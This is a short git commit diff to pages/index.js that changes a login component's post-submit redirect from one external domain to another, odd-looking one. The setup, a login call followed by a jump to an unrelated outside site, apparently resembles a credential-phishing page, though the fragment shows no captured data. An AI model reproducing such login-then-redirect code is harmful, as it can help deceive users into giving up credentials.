9e4c01d418db3322abded4c9920185db9e776f2a
husknet <127146284+husknet@users.noreply.github.com>
2025-03-24 14:49:24 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://sg.ca-abb.com/';
+      window.location.href = 'https://sgcook.constructlonjproy.com/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
